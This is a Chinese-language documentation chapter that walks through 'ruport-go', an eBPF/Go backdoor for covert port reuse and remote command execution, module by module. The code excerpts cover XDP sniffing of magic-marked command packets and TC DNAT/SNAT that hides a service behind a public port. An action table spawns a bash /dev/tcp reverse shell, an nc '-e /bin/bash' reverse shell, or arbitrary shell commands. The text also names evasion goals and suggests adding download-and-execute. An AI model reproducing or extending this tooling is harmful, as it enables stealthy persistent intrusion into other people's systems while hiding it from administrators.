# 07 · ruport-go 实战解析（逐模块）

目标：把本仓库的每一块代码讲透——它做什么、为什么这么写、对应原
C/libbpf 版本的哪一段。读完本章，你应该能独立改需求（换端口规则、
加指令类型、换网卡选择策略）而不破坏整体语义。

前置阅读：doc/01（原理）、doc/04 §7（字节序）、doc/05 §3（TC 挂载）。

---

## 0. 全景数据流

```
 控制端 c3 ──TCP──▶ 被控端开放端口(如 80)
                        │
                        ▼ XDP (xdp_parse, SKB 模式)
                 魔术标记命中 → 解析 124B Message → message_map[key=(cip<<16)+cport]
                        │                                    │
                        │ XDP_PASS，包继续走正常业务          │ 用户态 goroutine 每秒
                        ▼                                    ▼
              （正常服务不受影响）        cmd/ruport 轮询 LookupAndDelete
                                                 │
                              ┌──────────────────┴──────────────────┐
                              ▼                                     ▼
                    control_router 写 router_map          control_process 动作
                    （高字节>0 则删）                      （反弹/执行 shell）
                                                 │
                                                 ▼
                 控制端后续流量 ──▶ TC ingress：目的端口→nativeport（DNAT 到隐秘服务）
                 隐秘服务回包   ──▶ TC egress：源端口→connport（SNAT 回出网端口）
```

一句话：**XDP 负责偷听指令，TC 负责改写双向流量，用户态负责决策与执行**。

## 1. bpf/common.h —— 跨边界契约

```c
#pragma pack(1)
struct Message {            // 124 字节指令消息（XDP 侧解析）
  __be16 ins;               // 指令：低字节=功能(01..04)，高字节=删除标志
  __be32 cip;               // 控制服务器 IP（网络序）
  __be16 cport;             // 控制服务器端口（网络序）
  __be16 connport;          // 出网端口（p1）
  __be16 nativeport;        // 本地真实服务端口（p2）
  unsigned char ext[100];   // 扩展数据（反弹类型名 / shell 命令）
};

struct Router {             // 10 字节路由项（TC 侧使用）
  __be32 cip; __be16 cport; __be16 connport; __be16 nativeport;
};
```

要点：

- **pack(1)**：所有字段紧凑排列（`ins` 后紧跟 `cip`，无对齐填充），
  Message 总长 110 字节（map value），Router 10 字节。Go 侧由 bpf2go
  `-type` 按 BTF 生成同布局结构体（`XdpMessage`/`TcRouter`），见
  doc/03 §6；
- **`__be` 前缀只是文档性 typedef**（= u16/u32），字节序语义靠约定维持：
  cip/cport/connport/nativeport 一律网络序，ins 是主机不可见的小端数值
  （c3 写入 `[12]=ins`、`[13]=del`，XDP 按 `*(__be16*)(pdata+12)` 原样取
  两个字节）；
- 常量 `LEN_DEFAULT_BUF=100`、`MAX_MAP_ENTRIES=1024` 与原版 types.h 一致。

## 2. bpf/ruport_xdp.bpf.c —— 指令嗅探

### 2.1 魔术标记 is_ins_package()

```c
static __inline _Bool is_ins_package(void *data, void *data_end) {
  __be16 s1 = *(__be16 *)data;                       // 偏移 0，2B
  if ((void *)(data + 2 + sizeof(__be16)) > data_end) return false;
  __be16 s2 = *(__be16 *)(data + 2);                 // 偏移 2，2B
  if ((void *)(data + 4 + sizeof(__be64)) > data_end) return false;
  __be64 s3 = *(__be64 *)(data + 4);                 // 偏移 4，8B
  __be64 ss1 = (__be32)s1 * (__be32)s1;              // 65535² < 2^32，不溢出
  __be64 ss2 = (__be32)s2 * (__be32)s2;
  if (ss1 + ss2 != s3) return false;                 // s1²+s2²=s3
  return true;
}
```

- 特征：TCP payload 前 12 字节构成毕达哥拉斯式校验，随机 s1/s2（奇数）
  使每次指令包字节都不同——降低特征匹配概率；
- 调用前 parse_package 已证明 `(data_end - pdata) >= 12 + sizeof(Message)`，
  因此函数内的零散检查是冗余保险（verifier 只认显式检查，多写无害）。

### 2.2 parse_package() 解析链

```
ethhdr → h_proto==ETH_P_IP
       → iphdr → version==4, protocol==IPPROTO_TCP
       → tcphdr 位置 = iph + ihl*4            （IP 选项安全）
       → payload 位置 = tcph + doff*4          （TCP 选项安全）
       → 长度检查: data_end - pdata >= 12 + sizeof(struct Message) (=122)
       → is_ins_package() 魔术校验
       → 逐字段拼 struct Message（偏移 12/14/18/20/22/24 起）
       → key = (u64)cip << 16 | cport
       → message_map 无则插入（BPF_ANY 但先 lookup 去重）
```

每一步解引用前都有对应的 `> data_end` 检查——这就是 01 章 §4.3 的
实战样板。`xdp_parse` 本体永远 `return XDP_PASS`：**只旁听，不拦包**，
正常业务（80 端口的 web 服务）完全无感。

### 2.3 与原版的差异

零逻辑差异（逐行对应原 ruport.xdp.c）。变化只有两处工程性：
文件名加 `.bpf.c` 后缀（bpf2go 惯例）、`#pragma pack` 从 types.h 挪进
common.h。

## 3. bpf/ruport_tc.bpf.c —— 双向端口改写

### 3.1 入站 tc_ingress（rx）

```c
key = (u64)sourceIp << 16 | sourcePort;      // 源地址（控制端）作键
value = router_map[key]
if (sourceIp==value->cip && sourcePort==value->cport && value->nativeport) {
    client_port = value->nativeport;
    sum = bpf_csum_diff(&tcph->dest, 4, &client_port, 4, 0);   // 增量和
    bpf_skb_store_bytes(skb, l4_off+offsetof(dest), &client_port, 2, 0);
    bpf_l4_csum_replace(skb, l4_off+offsetof(check), 0, sum, BPF_F_PSEUDO_HDR);
    if (value->connport == 0) {               // 学习：记录实际目的端口
        tmp = *value; tmp.connport = destPort; router_map[key]=tmp;
    }
}
```

- 命中条件三连：源 IP、源端口匹配路由项 + nativeport 已知；
- **DNAT 语义**：把“发往 80（对外端口）”的包改投递到 nativeport（如 22），
  本地隐秘服务看到的是发给自己的正常连接；
- **端口学习**：控制端首次发包时 router_map 里 connport 可能为 0（c3 未
  指定 -x），ingress 把包**实际到达的目的端口**（即对外端口）记下来，
  egress 侧据此把回包源端口改回同一个值——闭环就此成立；
- `bpf_csum_diff(&tcph->dest, 4, ...)` 传 4 字节（虽然只写 2 字节）是
  原版写法，反码和下 16 位等价，Go 版无需对应（这是内核侧代码）。

### 3.2 出站 tc_egress（tx）

镜像逻辑：`key=(destIp<<16)|destPort`（目的地址=控制端），命中且
connport 已知 → 源端口改写为 connport（SNAT），并把“本机实际使用的
源端口”（nativeport 未知时）学习进 map。

### 3.3 为什么固定 l4_off = ETH_HLEN + 20

原版即如此：不解析 IP 选项（ihl 恒按 20 算）。对绝大多数流量成立
（内核默认不发带选项的 IP 包）。如果目标环境有 IP 选项流量，改写会
miss——这是有意的简化，不是 bug；需要兼容时可按 `ihl*4` 动态偏移并
重算 IP checksum。

### 3.4 一来一回的完整时序

```
控制端 ── dst=对外端口 ──▶ ingress 改 dst=nativeport ──▶ 隐秘服务收到
隐秘服务 ── src=nativeport ──▶ egress 改 src=connport(=对外端口) ──▶ 控制端看到
```

对控制端：整个会话看起来就是和“对外端口”在通信；对被控端系统管理
员：`ss -tlnp` 只看到 80 和 nativeport 两个正常监听。这就是“端口复用”。

## 4. cmd/ruport/main.go —— 加载、挂载、轮询、清理

### 4.1 参数与网卡选择

- `-i eth0`：`net.InterfaceByName` → ifindex；
- 未指定：`getCommonNetdevIfindex()` 读 `/proc/net/dev`，跳过 `lo`，
  取 **tx_bytes（第 9 列）最大**的网卡——与原版相同（原版 C 里
  `txbytes` 未初始化是 UB，Go 版从 0 开始，行为反而确定）；
- `-p`/`-H`：兼容保留（见 doc/07 §8 差异表）。

### 4.2 挂载链（顺序即依赖）

```go
rlimit.RemoveMemlock()                 // ① <5.11 内核需要
bpf.LoadXdpObjects(nil)                // ② XDP 对象（含 verifier）
link.AttachXDP(GenericMode)            // ③ XDP 挂载（link 化，可 Close）
bpf.LoadTcObjects(nil)                 // ④ TC 对象
attachTcFilters(...)                   // ⑤ clsact + 两个 filter（netlink）
go waitWeakupWorker(...)               // ⑥ 轮询 goroutine
<-sigCh                                // ⑦ 等 SIGINT/SIGSEGV
tcAt.release(); xdpLink.Close(); objs.Close()   // ⑧ 逆序清理
```

⑧ 的顺序不可乱：先删 TC filter（它们引用程序 FD），再关 XDP link，
最后 `Close()` 程序/map 对象。经典 TC filter 的“死不松手”特性见
doc/05 §3.2——这也是为什么必须显式信号处理而不是只靠 defer。

### 4.3 pollMessages：与 C 版等价的消费语义

```go
iter := msgMap.Iterate()
for iter.Next(&key, &msg) { keys = append(keys, key) }   // 先收集
for _, k := range keys {
    if err := msgMap.LookupAndDelete(k, &m); err != nil { continue }
    ctl.HandleRouter(&m, routerMap)
    ctl.HandleProcess(&m)
}
```

原 C 版：`while (get_next_key(...) == 0) { lookup_and_delete; ... }`。
语义差异：Go 版“先快照 key 再删”，C 版“边走边删”——两者在并发插入下
都不是严格快照，且都可能跳过/重访个别 key；message_map 的“同 key 只存
一条、处理即删除”让这点差异无实际影响。

### 4.4 SIGSEGV 也注册的原因

原版 `setsigint()` 同时挂 SIGINT/SIGSEGV，任何一路都 `releaseall()+exit(1)`。
Go 侧 `signal.Notify(sigCh, syscall.SIGINT, syscall.SIGSEGV)` 同构——
SIGSEGV 在 Go 里通常是运行时致命错误的前奏，能走到清理代码是尽力而为，
但 TC filter 的残留问题（§4.2）值得一搏。

## 5. internal/control/control.go —— 指令处理

### 5.1 HandleRouter（control_router 等价）

```
hiByte = ins>>8（删除标志）, loByte = ins&0xff
key = uint64(cip)<<16 + uint64(cport)      // 与内核同一份原始字节序数值
hi>0: router_map.LookupAndDelete(key) → 日志
else: 已存在 → 跳过
      日志 "insert a router"
      switch loByte:
        0x01: nativeport==0 → "the nativeport is needed." 退出
              否则 fallthrough 插入
        0x02,0x03: 插入 Router{cip,cport,connport,nativeport}
```

注意 Go 的 `fallthrough` 被显式 if 替代（Go switch 不自动落穿，语义
用提前 return 表达），行为与 C 的 case 0x01 fallthrough 一致。

### 5.2 字节序助手（本项目最烧脑的 15 行）

```go
func ip2str(ipv4 uint32) string {
    b := make(net.IP, 4)
    binary.LittleEndian.PutUint32(b, ipv4)   // ①
    return b.String()                         // ②
}
func toHostPort(port uint16) uint16 {
    var b [2]byte
    binary.LittleEndian.PutUint16(b[:], port) // ①
    return binary.BigEndian.Uint16(b[:])      // ②
}
```

推导链（小端主机）：

- map 里的 `cip` 是网络序**字节**；库 marshal 成 Go `uint32` 时按主机序
  （小端）解释这 4 个字节 → 得到一个“看起来反了”的数；
- ① 把这个数按小端写回字节 → **还原出内存里的原始网络序字节**；
- ② 按字段的实际语义（IP=大端、端口=ntohs）重新解释。
  端口是“数→数”：BigEndian.Uint16 得到主机序数值；IP 直接把字节当
  net.IP（net.IP.String() 按 4 字节点分输出）。

**key 计算不受此影响**：`uint64(msg.Cip)<<16 | cport` 两端（内核/用户）
都用“map 原始字节按小端解释的数值”，同一份数据算出同一个 key——
字节序只影响“给人看的转换”，不影响匹配。

### 5.3 HandleProcess（control_process 等价）

| loByte | 动作 | 细节 |
|---|---|---|
| 0x01 | 无 | 只加路由（HandleRouter 已完成） |
| 0x02 + hi>0 | 杀反弹 | map[procKey]pid → `syscall.Kill(pid, SIGINT)` → 删除记录 |
| 0x02 + ext="bash" | bash 反弹 | `exec.Command("/bin/sh","-c","bash -i >& /dev/tcp/IP/PORT 0>&1").Start()`；不记 pid（与原版一致：bash 子进程独立存活） |
| 0x02 + ext="nc" | nc 反弹 | `exec.Command(cwd+"/nc", ip, port, "-e","/bin/bash").Start()`；记 pid |
| 0x03 | 执行 shell | `exec.Command("/bin/sh","-c", extString).Start()` |
| 0x04 | 空实现 | 原版即未实现 |

- `extString`：ext[100] 截到首个 NUL——对应 C 的 `strlen(msg->ext)`
  语义（c3 用零填充包尾，天然 NUL 结尾）；
- `exec.Command(...).Start()` = fork+exec 不 wait（C 版 fork 后父进程
  也不 wait），子进程脱离后自行存活；nc 子进程因记录了 pid 可被 0x02+hi
  定点击杀；不 Wait 的代价是子进程退出后变 zombie 直到 ruport 退出——
  与原版一致，属可接受取舍；
- procKey = {cip, cport}，对应原 FunctionNode 链表的检索键，容器从链表
  换成 `map[procKey]int` + `sync.Mutex`。

## 6. cmd/c3/main.go —— 指令发送端

124 字节包布局（与 c3.py 逐字节一致）：

```
偏移   长度  内容                     写入方
0      2    s1（随机奇数, LE）        Go: binary.LittleEndian.PutUint16
2      2    s2（随机奇数, LE）
4      8    s3 = s1²+s2²（LE）       PutUint64
12     1    ins 低字节
13     1    0x01=删除 / 0x00
14     4    cip（inet_aton，网络序）   copy(net.ParseIP(ip).To4())
18     2    cport（htons）            BigEndian.PutUint16
20     2    connport（p1, htons）
22     2    nativeport（p2, htons）
24     100  ext（UTF-8，零填充）       copy()
```

校验规则照抄：`0 < port < 65535`（注意原版就是 `<`，65535 被拒）；
`p1` 缺省取 `-p` 目标端口；`ins&0xff==0x01` 时 `p2` 必填。发送用
`net.DialTimeout` 5 秒 + WriteDeadline（对应 python 的 `settimeout(5)`）。

与 c3.py 的两处非破坏性差异：Go flag 对非法参数直接报错退出（python 的
getopt 异常路径本身是崩溃）；`-i` 与 `-1..-4` 同给时 `-i` 优先（python
按命令行顺序后者生效——极边缘场景）。

## 7. internal/bpf/ —— 生成绑定

- `doc.go`：占位说明（保证 `make generate` 之前包不空、tidy 可跑）；
- `Xdp_bpfel.go`/`Tc_bpfel.go` 等：`make generate` 产物（gitignore，
  不入库）。Makefile 用大写 ident（Xdp/Tc），bpf2go 生成的加载函数
  `LoadXdpObjects/LoadTcObjects`（填充式 `obj any, opts`）本身就是
  导出的，main.go 直接调用，无需手写封装（命名规则见 doc/03 §4）。

## 8. C 版 ↔ Go 版对照速查

| 原 ruport (C/libbpf) | ruport-go | 位置 |
|---|---|---|
| `ruport_xdp__open/load` | `bpf.LoadXdpObjects(nil)` | main.go |
| `bpf_xdp_attach(ifindex, fd, XDP_FLAGS_SKB_MODE, opts)` | `link.AttachXDP(..., XDPGenericMode)` | main.go |
| `bpf_tc_hook_create(BPF_TC_EGRESS/INGRESS)` | `netlink.QdiscAdd(&Clsact{...})`（EEXIST 忽略） | attachTcFilters |
| `bpf_tc_attach(hook, opts{priority=1,handle=1})` | `netlink.FilterAdd(&BpfFilter{...})` | attachTcFilters |
| `bpf_map_get_next_key` 循环 | `Map.Iterate()` 收集 key | pollMessages |
| `bpf_map_lookup_and_delete_elem` | `Map.LookupAndDelete(k,&m)` | pollMessages |
| `control_router/control_process` | `Controller.HandleRouter/HandleProcess` | control.go |
| `fork+execl("/bin/sh","sh","-c",cmd)` | `exec.Command("/bin/sh","-c",cmd).Start()` | control.go |
| `kill(pid, SIGINT)` | `syscall.Kill(pid, syscall.SIGINT)` | control.go |
| `signal(SIGINT/SIGSEGV, stop)` | `signal.Notify(sigCh, ...)` + 清理 | main.go |
| `bpf_tc_detach + bpf_tc_hook_destroy` | `FilterDel ×2 + QdiscDel` | tcAttach.release |
| `ruport_xdp__destroy` | `objs.Close()` | main.go |
| pidhide（已注释禁用） | **不移植** | — |

## 9. 常见修改怎么落

- **换对外/功能端口规则**：c3 的 `-x/-y` 参数就是为此设计，代码无需改；
  要改匹配条件才动 `ruport_tc.bpf.c` 的命中判断；
- **新增指令（如 0x05 下载执行）**：types 无需变；control.go 加 case；
  c3/main.go 的 printMsg 加一行；
- **多网卡**：原版即单网卡设计（原 `get__common_netdev_ifindex` 也只选
  一个）；多网卡需要把 xdp/tc 挂载做成 per-ifindex 列表，属于结构性改动；
- **换轮询为事件驱动**：把 message_map 改 ringbuf 语义需要 XDP 侧改用
  `bpf_ringbuf_submit`（XDP 程序允许），用户态换 `ringbuf.NewReader`
  阻塞等待——参考 doc/06 例 3；但“取走即删”的握手语义要重新设计。

---

下一章：[08-troubleshooting.md](08-troubleshooting.md)——出事了先翻这里。
